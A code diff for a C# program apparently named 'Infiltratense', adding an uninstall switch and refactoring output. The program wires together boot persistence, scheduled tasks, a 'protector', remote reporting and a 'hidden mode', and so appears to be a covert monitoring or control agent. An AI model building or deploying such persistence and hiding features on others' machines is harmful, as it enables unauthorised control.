@@ -16,7 +16,7 @@ namespace Infiltratense
     {
         public static void Main(string[] args)
         {
-            Console.WriteLine("\n\n Infiltratense by Obisoft.\n\n Version : " + Strings.Version);
+            Logger.Print("\n\n Infiltratense by Obisoft.\n\n Version : " + Strings.Version);
             if (args.Length > 0)
             {
                 var Arg = args[0];
@@ -25,18 +25,25 @@ namespace Infiltratense
                     case "v":
                         break;
                     case "h":
-                        Console.WriteLine("\n\n-v -version\t\tView current version number.");
-                        Console.WriteLine("-h -help\t\tView help.");
-                        Console.WriteLine("-s -switch\t\tSwitch to hidden mode.");
+                        Logger.Print("\n\n-v -version\t\tView current version number.");
+                        Logger.Print("-h -help\t\tView help.");
+                        Logger.Print("-s -switch\t\tSwitch to hidden mode.");
+                        Logger.Print("-r -remove\t\tRemove created startup service.");
                         break;
                     case "s":
                         ProcessService.StartProcess(CellFileInfo.ProgramFile, false);
                         break;
-
+                    case "r":
+                        SelfDestory();
+                        break;
                 }
                 return;
             }
+            Run();
+        }
 
+        public static void Run()
+        {
 #if DEBUG
             var host = new HostService()
                 .UseAutoUpdateService(CurrentVersion: Strings.Version, Debug: true, ForceCurrent: true)
@@ -51,10 +58,22 @@ namespace Infiltratense
                 .UseProtectorService(Disable: false, Debug: false)
                 .UseStartWithBootService(Set: true)
                 .UseTaskSchedulerService(Disabled: false)
-                .UseReportService(TimeOut: 1000,Delay:false)
+                .UseReportService(TimeOut: 1000, Delay: false)
                 .UseStartUp<StartUp>();
 #endif
             host.Run();
+        }
+
+        public static void SelfDestory()
+        {
+            var Destoryer = new HostService()
+                           .UseTaskSchedulerService(Disabled: true)
+                           .UseStartWithBootService(Set: false)
+                           .UseStartUp<StartUp>();
+
+            Destoryer.Run();
+
+            Logger.PrintSuccess("Removed all records. Please restart your computer and delete all files by yourself!");
         }
     }
 }
